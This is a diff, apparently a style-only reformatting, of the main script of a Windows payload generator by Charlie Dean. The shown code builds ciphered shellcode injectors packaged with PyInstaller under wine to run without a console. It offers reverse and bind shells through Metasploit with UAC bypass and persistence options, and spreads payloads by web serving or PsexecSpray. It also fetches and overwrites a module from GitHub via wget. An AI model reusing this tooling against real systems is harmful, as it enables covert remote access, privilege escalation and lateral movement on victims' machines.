@@ -5,17 +5,19 @@ from lib.startmetasploit import *
 
 try:
     print t.clear + t.bold_green + '[*] Updating Modules..'
-    URL = urllib2.urlopen('https://raw.githubusercontent.com/Charliedean/PsexecSpray/master/psexecspray.py')
+    URL = urllib2.urlopen(
+        'https://raw.githubusercontent.com/Charliedean/PsexecSpray/master/psexecspray.py')
     EMPTY, module_psexecspray_version = URL.readline(), URL.readline()
 
-    MODULEFILE = open('./lib/psexecspray.py','r')
-    EMPTY, module_psexecspray_local_version = MODULEFILE.readline(),MODULEFILE.readline()
+    MODULEFILE = open('./lib/psexecspray.py', 'r')
+    EMPTY, module_psexecspray_local_version = MODULEFILE.readline(), MODULEFILE.readline()
 
     print t.bold_green + '[*] Local Psexecspray Version = ' + module_psexecspray_local_version[1:-1]
     print t.bold_green + '[*] Psexecspray Version = ' + module_psexecspray_version[1:-1] + t.normal
     if float(module_psexecspray_version[1:-1]) > float(module_psexecspray_local_version[1:-1]):
         os.system('rm ./lib/psexecspray*')
-        os.system('wget https://raw.githubusercontent.com/Charliedean/PsexecSpray/master/psexecspray.py -O ./lib/psexecspray.py')
+        os.system(
+            'wget https://raw.githubusercontent.com/Charliedean/PsexecSpray/master/psexecspray.py -O ./lib/psexecspray.py')
         print t.bold_green + '[*] Modules Updated!' + t.normal
     elif float(module_psexecspray_version[1:-1]) == float(module_psexecspray_local_version[1:-1]):
         print t.bold_green + '[*] Modules up to date!' + t.normal
@@ -50,7 +52,7 @@ print "   | |     / (_)___  / __ \____ ___  __/ /___  ____ _____/ /____".center(
 print "   | | /| / / / __ \/ /_/ / __ `/ / / / / __ \/ __ `/ __  / ___/".center(t.width)
 print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.width)
 print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
-print "   /____/Charlie Dean".center(t.width+11)
+print "   /____/Charlie Dean".center(t.width + 11)
 print t.normal + '=' * t.width
 print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
        t.bold_red + ' [Shellter]').center(t.width - 44) + t.normal
@@ -161,12 +163,13 @@ try:
 
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows % (ez2read_shellcode)))
+            Filesave.write(FUNCTIONS().DoPyCipher(
+                SHELLCODE.injectwindows % (ez2read_shellcode)))
             Filesave.close()
 
         print '[*] Creating Payload using Pyinstaller...'
         p = subprocess.Popen(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                         '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                              '%s/payload.py' % payloaddir, '--noconsole', '-F', '-y', '-o', payloaddir], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         LOADING = Spinner()
         while p.poll() == None:
             LOADING.Update()
@@ -175,7 +178,7 @@ try:
         sys.stdout.flush()
 
         payloadstderr = p.stderr.read()
-        if re.search('error',payloadstderr.lower()):
+        if re.search('error', payloadstderr.lower()):
             print t.bold_red + '[*] Error In Creating Payload... Exiting..\n' + t.normal + payloadstderr
             raise KeyboardInterrupt
 
@@ -237,7 +240,8 @@ try:
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
-        FUNCTIONS().DoServe(want_to_payloadinexe,want_to_upload,IP,payloadinexe_payloadnameshort,payloadname,payloaddir)
+        FUNCTIONS().DoServe(want_to_payloadinexe, want_to_upload, IP,
+                            payloadinexe_payloadnameshort, payloadname, payloaddir)
 
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
         DoPsexecSpray(payloaddir + '/' + payloadname)
@@ -259,13 +263,13 @@ try:
         bindip = raw_input(
             '\n[*] Target Bind IP Address \n[*] IP> ')
         if want_UACBYPASS.lower() == 'y':
-            METASPLOIT().metbind_uac(bindport,bindip)
+            METASPLOIT().metbind_uac(bindport, bindip)
         elif want_ALLCHECKS.lower() == 'y':
-            METASPLOIT().metbind_allchecks(bindport,bindip)
+            METASPLOIT().metbind_allchecks(bindport, bindip)
         elif want_PERSISTENCE.lower() == 'y':
-            METASPLOIT().metbind_persistence(bindport,bindip)
+            METASPLOIT().metbind_persistence(bindport, bindip)
         else:
-            METASPLOIT().metbind_normal(bindport,bindip)
+            METASPLOIT().metbind_normal(bindport, bindip)
 
     elif menuchoice == '4':
         if want_UACBYPASS.lower() == 'y':
